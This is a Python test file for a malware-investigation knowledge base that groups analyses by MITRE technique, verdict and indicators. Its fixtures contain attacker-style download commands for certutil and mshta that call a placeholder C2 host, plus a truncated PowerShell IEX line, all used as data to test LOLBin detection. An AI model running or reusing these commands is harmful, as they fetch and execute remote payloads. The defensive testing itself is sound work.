"""Tests for the Knowledge Base pipeline (fingerprint, aggregate, endpoints)."""
from __future__ import annotations
from datetime import datetime, timezone

import pytest

from knowledge_base.fingerprint import (
    compute_fingerprint, top_mitre_ids, verdict_bucket, shellcode_marker, slug_for,
)
from knowledge_base.builder import _aggregate_bucket, _bucketize, _samples_of
from knowledge_base.schema import KBEntry, KBIocRollup


# ─── Fixtures ────────────────────────────────────────────────────────────
def _mk_inv(mitre_ids=None, verdict="Malicious", engine="smart",
            iocs=None, input_p="powershell -c IEX(...)", output_p="calc.exe",
            reached_shellcode=False, chain=None, ts=None):
    return {
        "_id": f"inv-{hash((tuple(mitre_ids or []), verdict, engine, input_p)) & 0xffff:04x}",
        "engine": engine,
        "input_preview": input_p,
        "output_preview": output_p,
        "chain": chain or ["from-base64","gunzip"],
        "reached_shellcode": reached_shellcode,
        "iocs": iocs or {"urls": [], "ips": [], "domains": []},
        "mitre": [{"id": m, "tactic": "execution"} for m in (mitre_ids or [])],
        "verdict": {"verdict": verdict, "summary": f"{verdict} PS chain"},
        "confidence": 78,
        "ts": ts or datetime.now(timezone.utc),
    }


# ─── Fingerprint tests ───────────────────────────────────────────────────
def test_fingerprint_stable_across_runs():
    inv = _mk_inv(mitre_ids=["T1059.001","T1105"])
    assert compute_fingerprint(inv) == compute_fingerprint(inv)


def test_fingerprint_same_regardless_of_mitre_order():
    a = _mk_inv(mitre_ids=["T1059.001","T1105","T1027"])
    b = _mk_inv(mitre_ids=["T1027","T1105","T1059.001"])
    assert compute_fingerprint(a) == compute_fingerprint(b)


def test_fingerprint_differs_by_verdict():
    a = _mk_inv(mitre_ids=["T1059.001"], verdict="Malicious")
    b = _mk_inv(mitre_ids=["T1059.001"], verdict="Suspicious")
    assert compute_fingerprint(a) != compute_fingerprint(b)


def test_fingerprint_differs_by_shellcode_flag():
    a = _mk_inv(mitre_ids=["T1059.001"], reached_shellcode=True)
    b = _mk_inv(mitre_ids=["T1059.001"], reached_shellcode=False)
    assert compute_fingerprint(a) != compute_fingerprint(b)


def test_top_mitre_dedupes_and_caps():
    inv = {"mitre": [{"id": "T1059.001"}, {"id": "T1059.001"}, {"id": "T1105"},
                     {"id": "T1027"}, {"id": "T1071.001"}]}
    tops = top_mitre_ids(inv, k=3)
    assert len(tops) == 3
    assert tops == sorted(tops)


def test_verdict_bucket_normalises():
    assert verdict_bucket({"verdict": {"verdict": "MALICIOUS"}}) == "malicious"
    assert verdict_bucket({"verdict": {"verdict": ""}}) == "unknown"
    assert verdict_bucket({}) == "unknown"


def test_shellcode_marker():
    assert shellcode_marker({"reached_shellcode": True}) == "shellcode"
    assert shellcode_marker({"reached_shellcode": False}) == "no-shellcode"


def test_slug_url_safe():
    fp = compute_fingerprint(_mk_inv(mitre_ids=["T1059.001","T1105"]))
    s = slug_for(_mk_inv(mitre_ids=["T1059.001","T1105"]), fp)
    import re
    assert re.match(r"^[a-z0-9][a-z0-9_\-]{0,64}$", s), f"unsafe slug: {s}"


# ─── Aggregation tests ───────────────────────────────────────────────────
def test_aggregate_bucket_counts_engines_and_chains():
    bucket = [
        _mk_inv(engine="smart", chain=["from-base64"]),
        _mk_inv(engine="smart", chain=["from-base64"]),
        _mk_inv(engine="ai",    chain=["from-base64","gunzip"]),
    ]
    agg = _aggregate_bucket(bucket)
    assert agg["engines"] == {"smart": 2, "ai": 1}
    assert "from-base64" in agg["common_chains"][0]


def test_aggregate_collects_iocs():
    bucket = [
        _mk_inv(iocs={"urls": ["http://x.io","http://y.io"], "ips": ["1.1.1.1"]}),
        _mk_inv(iocs={"urls": ["http://x.io"], "domains": ["evil.top"]}),
    ]
    agg = _aggregate_bucket(bucket)
    assert agg["iocs"]["urls"]["http://x.io"] == 2
    assert agg["iocs"]["urls"]["http://y.io"] == 1
    assert "evil.top" in agg["iocs"]["domains"]


def test_aggregate_detects_lolbin_from_output():
    bucket = [
        _mk_inv(output_p="certutil.exe -urlcache -split -f http://c2/a.exe"),
        _mk_inv(output_p="mshta.exe http://c2/x.hta"),
    ]
    agg = _aggregate_bucket(bucket)
    assert "certutil.exe" in agg["lolbins"]
    assert "mshta.exe" in agg["lolbins"]


def test_aggregate_picks_dominant_verdict():
    bucket = [
        _mk_inv(verdict="Malicious"),
        _mk_inv(verdict="Malicious"),
        _mk_inv(verdict="Suspicious"),
    ]
    assert _aggregate_bucket(bucket)["verdict"] == "Malicious"


def test_samples_of_returns_newest_first():
    old = _mk_inv(ts=datetime(2025, 1, 1, tzinfo=timezone.utc), input_p="old")
    new = _mk_inv(ts=datetime(2026, 1, 1, tzinfo=timezone.utc), input_p="new")
    samples = _samples_of([old, new], k=2)
    assert samples[0].input_preview == "new"
    assert samples[1].input_preview == "old"


# ─── Bucketize / builder end-to-end (offline; no LLM) ────────────────────
def test_bucketize_groups_similar_investigations():
    invs = [
        _mk_inv(mitre_ids=["T1059.001","T1105"], verdict="Malicious"),
        _mk_inv(mitre_ids=["T1105","T1059.001"], verdict="Malicious", input_p="different but same fp"),
        _mk_inv(mitre_ids=["T1218.005"], verdict="Suspicious", input_p="mshta chain"),
    ]
    buckets = _bucketize(invs)
    assert len(buckets) == 2
    sizes = sorted(len(b) for b in buckets.values())
    assert sizes == [1, 2]


# ─── KBEntry model validation ────────────────────────────────────────────
def test_kb_entry_model_serialises():
    e = KBEntry(
        slug="t1059_001-t1105-malicious-abcd",
        fingerprint="kb-abcd1234",
        title="PowerShell IEX downloader",
        summary="Base64/gzip stager fetching PowerShell payload.",
        severity="high",
        verdict="Malicious",
        mitre_ids=["T1059.001","T1105"],
        tactics=["execution","command-and-control"],
        engines={"smart": 3, "ai": 1},
        common_chains=["from-base64 → gunzip"],
        iocs=KBIocRollup(urls={"http://c2/x": 2}),
        lolbins=["certutil.exe"],
        investigation_ids=["inv-a","inv-b"],
        investigation_count=2,
        playbook_steps=["Contain host","Pull memory dump"],
        user_email="admin@nivxray.com",
    )
    d = e.model_dump()
    assert d["slug"] == e.slug
    assert d["iocs"]["urls"]["http://c2/x"] == 2


# ─── LLM provider chain ──────────────────────────────────────────────────
def test_provider_chain_lists_online_then_offline():
    from llm_provider import list_providers
    chain = list_providers()
    assert len(chain) >= 2
    assert chain[0]["kind"] == "online"
    kinds = [c["kind"] for c in chain]
    assert "offline" in kinds
